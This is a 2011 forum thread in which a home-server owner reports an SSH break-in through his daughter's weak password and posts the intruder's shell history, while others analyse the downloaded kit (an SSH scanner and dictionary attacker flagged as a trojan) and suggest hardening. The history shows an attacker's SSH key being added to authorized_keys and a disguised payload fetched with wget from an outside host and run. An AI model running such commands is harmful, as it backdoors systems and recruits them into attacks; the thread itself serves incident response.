---
title: "Hacked!"
date: 2011-03-16
forum: Security
---

### Post by crh0831 on 2011-03-16
A couple hours ago I heard the server in my living room howling.  Thinking the fan was starting to go bad I turned on the monitor and signed in.  The first thing I noticed was the CPU temp was high (66C)  Suggesting the fan was bad or the CPU was working extra hard.

Before I opened her up I ran TOP and noticed the CPU being hogged by a couple of processes owned by my 17 year-old daughter.  WHAT?  She wasn't even logged in. Rmembering that I had set her and my wife up with SSH access to the file server from their laptops, I suspected the worst...

Long story short - her account was hacked from outside.  I immediately rebooted, changed the passwords and installed denyhosts (why didn't I do that earlier?)

After perusing the logs I noticed the daemon ssh-scan segfaulting quite a bit today.  I can't find any trace of the application so I checked her .bash_profile.  BINGO!

Check it out...
                                                                                                                                                         
```

ps -e | grep audio
killall pulseaudio
sudo killall pulseaudio
w
passwd
w
uname -a
cd
cd .ssh
ls -a
mkdir .ssh
cd .ssh
echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIBSUxeR1W95aH+iJwXRJaswx6YwqqZPk2BBLaGoJR5vnLARZbpMZzxfjo9wwed/FONEcnZFVo0eTkaZ+                                          xDaC8eDvT0A4gRC2ahK7sCM17nbRvwGdXPIKismvz6Xqp7mLRf+I2jI6xKq8lba96U6uUHtbiaRi814IyJ3Q0It54KBwQ== rsa-key-20080201 >> ~/.ssh/authorized_keys; chmod 700 ~/.ssh;          chmod 600 ~/.ssh/authorized_keys
exit
cd
cd /dev/shm
ls -a
mkdir "... /"
cd "... /"
ls -a
wget http://root-arhive.do.am/scanner/goshNEW.jpg  ; tar zxvf goshNEW.jpg ; cd goshNEW ; chmod +x * 
screen
exit
./mass 80
cd .ssh
ls
exit

```I see that he imported an SSH key (I disabled it) and changed to /dev/shm to download and run his payload.  But I can't find it.  What is /dev/shm?  And what is mkdir ... / ?  I've never seen that.  What does that do? 
Would the tarball have deleted itself when I rebooted?  Anybody with any advice on where else I can look to make sure I've gotten rid of this pest?  I'd appreciate it.

Lesson learned.

*sigh*

---

### Post by ask1597 on 2011-03-16
not too sure about the dev/shm file i do know that mkdir= make directory(make folder)i'm no expert but i would suggest only allowing access to specific mac address or restricting the i.p's of client to those that you know.

---

### Post by crh0831 on 2011-03-16
I did make the following changes:


[LIST]
[*]allowed only myself to access SSH from outside my LAN (via AllowUsers in sshd_config) (I'm using a key strong password)
[*]allowed my wife and daughter to access SSH only from the LAN (again, via sshd_config)  (also changed their weak-*** passwords to something stronger)
[*]installed denyhosts.  Boy, did hosts.deny fill up once it parsed my auth.log!
[/LIST]

Since I posted this - I've read that /dev/shm is a temporary filesystem that uses RAM.  In essence, once I rebooted, the evidence went *poof*.  However, right now that folder has 777 permissions.  Is that right?

Thanks again for any assistance.

---

### Post by ask1597 on 2011-03-16
no sure on how many permissions it should have tbh.I've taken this extract from another site...[http://www.cyberciti.biz/tips/what-is-devshm-and-its-practical-usage.html](http://www.cyberciti.biz/tips/what-is-devshm-and-its-practical-usage.html)

If you type mount command you will see /dev/shm as a tempfs file system.  Therefore, it is a file system, which keeps all files in virtual  memory. Everything in tmpfs is temporary in the sense that no files will  be created on your hard drive. If you unmount a tmpfs instance,  everything stored therein is lost. By default almost all Linux distros  configured to use /dev/shm.

scan for root kits.There is a writeable area within the shm so if there was something put  in it would be there have a look at the permissions tio find it as i  personally dont know where it is and try unmounting and remounting your dev/shm..Also is your system updated and try not to use common ports like 80 or 8080.

---

### Post by wojox on 2011-03-16
Did you look at the script's at all? I downloaded it and here's one bash script

```
#!/bin/bash
if [ `whoami` == "root" ]; then
chmod -x /usr/bin/mail
mv /usr/bin/mail /usr/bin/s8
echo " Done , You can scan now "
else
echo -e " you're not root you're `whoami` with id `id` !! "
fi
```

Check your /usr/bin/

---

### Post by sisco311 on 2011-03-16
> **wojox said:**
> Did you look at the script's at all? I downloaded it and here's one bash script

I downloaded the .jgp file, which is actually a .tar archive. So, I extracting it... 

The file CITESTE-INAINTE-SA-INCEPI (READ-BEFORE-YOU-START in Romanian :redface: ) contains instructions about how to use the other files included in the archive to hack an OS. 

I'm not a security expert, but, crh0831, I think , you  should backup your data & reinstall Ubuntu.

---

### Post by inobe on 2011-03-16
if an ~/.ssh doesn't exist, one can be created running

```
mkdir .ssh
```

---

### Post by dmizer on 2011-03-16
> **sisco311 said:**
> I downloaded the .jgp file, which is actually a .tar archive. So, I extracting it... 

The file CITESTE-INAINTE-SA-INCEPI (READ-BEFORE-YOU-START in Romanian :redface: ) contains instructions about how to use the other files included in the archive to hack an OS. 

I'm not a security expert, but, crh0831, I think , you  should backup your data & reinstall Ubuntu.

I agree. The first part of it is an ssh server scanner which scans LAN IP addresses as well as WAN IPs for active ssh servers. If you had any other machines (with ssh servers) on your network, they may have been compromised as well.

I am not sure what the rest of it does, but my guess is rootkit, so I agree with sisco311, a backup and reinstall would be appropriate.

---

### Post by wojox on 2011-03-16
> **sisco311 said:**
> I downloaded the .jgp file, which is actually a .tar archive. So, I extracting it... 

The file CITESTE-INAINTE-SA-INCEPI (READ-BEFORE-YOU-START in Romanian :redface: ) contains instructions about how to use the other files included in the archive to hack an OS. 

I'm not a security expert, but, crh0831, I think , you  should backup your data & reinstall Ubuntu.

I tried Google Translate but it kept saying Italian and it didn't translate it? Romania, go figure. :P

They have some great dictionary scripts in there. And it did look like it was turning it out pretty quickly.

I concur as well. Back up and reinstall.

---

### Post by Rhubarb on 2011-03-16
ClamTK reports that it's a trojan:
**Trojan.Linux.RST.b**

I've had a quick look at some of the files.  It looks like it does a dictionary attack to get ssh access to found ssh servers (it tries very hard to crack user root's passwords - about half of the dictionary words are for user "root")

A quick google search says that it infects binaries, see here:
[http://www.symantec.com/security_response/writeup.jsp?docid=2004-052312-2729-99](http://www.symantec.com/security_response/writeup.jsp?docid=2004-052312-2729-99)

I would suggest to backup the server (not binaries, just documents, media, etc), do a clean re-install.
Then for ssh access: consider using key-only access or enforce a stronger password policy, move to a non-standard ssh port, and perhaps use denyhosts.

It's nice to see that most of the source code for it is viewable, as most of it uses scripts :D

That's an interesting trojan that you've found there :)

---

### Post by rookcifer on 2011-03-17
Backup important data, reformat the drive and reinstall the OS from scratch.  That's you're only safe option.

Once you reinstall, go read up on how to secure SSH.  You really should not be running an SSH server unless you know the basics on how to secure it.

---

### Post by crh0831 on 2011-03-17
Well, first of all - thanks to all who've written with their opinions.

I have taken steps to secure my box.  (Changed SSH port, installed DenyHosts, set-up password-less login...)  I'm ashamed to admit that these are all things I knew to do - but didn't do because I was lazy.

After my post yesterday, I did some more research and found an interesting article ([http://people.clarkson.edu/~owensjp/pubs/Owens_MS_thesis.pdf]("http://people.clarkson.edu/%7Eowensjp/pubs/Owens_MS_thesis.pdf")) that discusses brute-force SSH attacks and mentions the particular set of scripts I found being used on my machine.

Unfortunately, I rebooted before I could catch anything "in-action", but by looking at the scripts involved (I dl'd the tarball and went through it), it seems my machine was setup as a zombie to do further port scanning.  Results were apparently emailed and maybe sent to IRC (my perl is so damn rusty)

My belief is that this was only the first wave in what may have been the construction of a botnet whose purpose was yet to be determined.

I did a thorough virus scan (clamav) and plugged the holes to prevent this from happening again.  I think I'm good now.

If anybody else downloads the payload and can determine exactly what the package was supposed to do - I'd love to hear more.  I don't feel reinstalling the OS is necessary, but would reconsider if some proof of incurable infection is found.

---

### Post by ptn107 on 2011-03-17
Review you sshd_config file and make sure it includes these:
```
PermitRootLogin no
PubkeyAuthentication yes
PasswordAuthentication no
AllowUsers *user1 user2 user3*
```

Replace *user1 user2 user3* with a space separated list of users who can access the server.

I have found that 'PermitRootLogin no' is just not enough.

---

### Post by Kinstonian on 2011-03-17
> **crh0831 said:**
> Well, first of all - thanks to all who've written with their opinions.

I have taken steps to secure my box.  (Changed SSH port, installed DenyHosts, set-up password-less login...)  I'm ashamed to admit that these are all things I knew to do - but didn't do because I was lazy.

After my post yesterday, I did some more research and found an interesting article ([http://people.clarkson.edu/~owensjp/pubs/Owens_MS_thesis.pdf]("http://people.clarkson.edu/%7Eowensjp/pubs/Owens_MS_thesis.pdf")) that discusses brute-force SSH attacks and mentions the particular set of scripts I found being used on my machine.

Unfortunately, I rebooted before I could catch anything "in-action", but by looking at the scripts involved (I dl'd the tarball and went through it), it seems my machine was setup as a zombie to do further port scanning.  Results were apparently emailed and maybe sent to IRC (my perl is so damn rusty)

My belief is that this was only the first wave in what may have been the construction of a botnet whose purpose was yet to be determined.

I did a thorough virus scan (clamav) and plugged the holes to prevent this from happening again.  I think I'm good now.

If anybody else downloads the payload and can determine exactly what the package was supposed to do - I'd love to hear more.  I don't feel reinstalling the OS is necessary, but would reconsider if some proof of incurable infection is found.

It's up to you how you want to go about trusting your computer again.  However, I think there are only two ways you can go about it.

1.  As suggested, you can spend time backing up and reinstalling, which will definitely enable you to have the most trust.

2.  Spend more time attempting to make sure, for example, there wasn't an earlier attacker who guessed the same weak credentials (if that's the original attack vector), and no attacker ever got root access or setup a backdoor.

It is difficult to prove the above negatives (see [Intruder Detection Checklist](http://www.selfsecurity.org/technotes/detect/Intruder_Detection_Checklist.html)), but answering questions like those-- combined with increased security monitoring to help verify your recovery worked (see the forum sticky threads), will help establish some level of trust without reinstalling.

---

